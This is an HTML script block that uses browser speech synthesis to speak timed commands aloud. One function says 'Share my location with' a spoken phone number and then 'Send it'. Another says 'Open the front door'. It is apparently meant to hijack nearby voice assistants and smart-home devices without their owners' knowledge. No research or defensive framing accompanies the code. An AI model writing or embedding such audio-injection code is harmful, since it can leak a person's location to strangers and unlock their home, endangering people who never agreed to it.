<script>
function speak(text) {
    const speech = new SpeechSynthesisUtterance(text);

    speech.lang = "en-US";
    speech.rate = 1;
    speech.pitch = 1;
    speech.volume = 1;

    window.speechSynthesis.speak(speech);
}

function share() {
    setTimeout(() => {
        speak("Share my location with");

        setTimeout(() => {
            speak("zero eight one two three four five six seven eight nine");

            setTimeout(() => {
                speak("Send it");
            }, 12000);

        }, 6000);

    }, 500);
}

function opendoor() {
    setTimeout(() => {
        speak("Open the front door");
    }, 500);
}
</script>
